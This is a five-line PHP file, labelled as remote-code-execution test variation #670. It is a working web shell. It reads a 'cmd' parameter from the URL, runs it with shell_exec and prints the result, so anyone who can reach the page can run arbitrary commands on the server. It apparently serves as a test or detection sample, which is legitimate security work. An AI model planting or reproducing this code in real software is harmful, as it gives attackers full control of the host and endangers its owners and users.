<?php
// RCE test variation #670
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>